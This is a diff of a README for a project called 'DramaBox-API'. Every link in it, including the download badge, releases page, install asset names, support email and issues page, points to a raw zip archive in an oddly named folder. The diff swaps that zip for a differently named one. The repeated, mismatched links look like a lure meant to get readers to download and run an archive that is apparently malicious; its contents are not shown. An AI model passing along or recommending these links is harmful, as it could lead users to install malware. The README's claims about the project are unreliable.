@@ -1,6 +1,6 @@
 # 🎭 DramaBox-API - Access Drama with Ease
 
-[![Download DramaBox-API](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip)](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip)
+[![Download DramaBox-API](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip)](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip)
 
 ## 🚀 Getting Started 
 
@@ -21,11 +21,11 @@ To start using DramaBox API, follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to go to our Releases page.
 
-   [Download DramaBox-API](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip)
+   [Download DramaBox-API](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip)
 
 2. **Find the Latest Version**: Look for the latest release. You will see a list of available versions. Typically, the most recent one is at the top.
 
-3. **Download the File**: Click on the asset that matches your operating system. This is commonly named something like `https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip` for Windows or `https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip` for Mac/Linux. This download may take a moment, depending on your internet speed.
+3. **Download the File**: Click on the asset that matches your operating system. This is commonly named something like `https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip` for Windows or `https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip` for Mac/Linux. This download may take a moment, depending on your internet speed.
 
 4. **Install the Application**: 
     - For Windows:
@@ -51,7 +51,7 @@ Once you have installed the application, you can start accessing drama content:
 
 To keep your application secure and efficient, regularly check for updates:
 
-1. **Check for Updates**: Periodically visit the [Releases page](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip) to see if a newer version is available.
+1. **Check for Updates**: Periodically visit the [Releases page](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip) to see if a newer version is available.
 2. **Follow Installation Steps Again**: If you find a newer version, follow the same steps to download and install it.
 
 ## 🤔 Troubleshooting
@@ -74,8 +74,8 @@ If you're interested in helping improve DramaBox API, feel free to contribute. H
 
 For any inquiries or support needs, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip
-- GitHub Issues: Use the [GitHub Issues section](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/DramaBox-API.zip) for reporting bugs or requesting features.
+- Email: https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip
+- GitHub Issues: Use the [GitHub Issues section](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip) for reporting bugs or requesting features.
 
 ---
 
